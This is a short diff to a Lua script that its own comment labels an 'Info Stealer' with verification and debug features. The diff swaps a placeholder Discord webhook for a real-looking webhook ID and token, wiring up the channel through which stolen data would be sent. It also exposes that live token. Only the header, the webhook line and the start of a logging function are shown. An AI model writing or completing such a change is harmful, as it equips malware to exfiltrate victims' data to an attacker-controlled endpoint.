@@ -1,5 +1,5 @@
 -- Info Stealer con Verificación y Debug
-local webhook = "https://discord.com/api/webhooks/TU_WEBHOOK_ID/TU_WEBHOOK_TOKEN"
+local webhook = "https://discord.com/api/webhooks/1530793538684452885/ZYEJFZ0ZKFm94KvPQgbWXBfHtjHJJ1PB1Bwel9kxwigxssIMgIYlX34QQswEYimnEuXv"
 
 -- Función para mostrar mensajes en la consola del ejecutor
 local function log(msg)
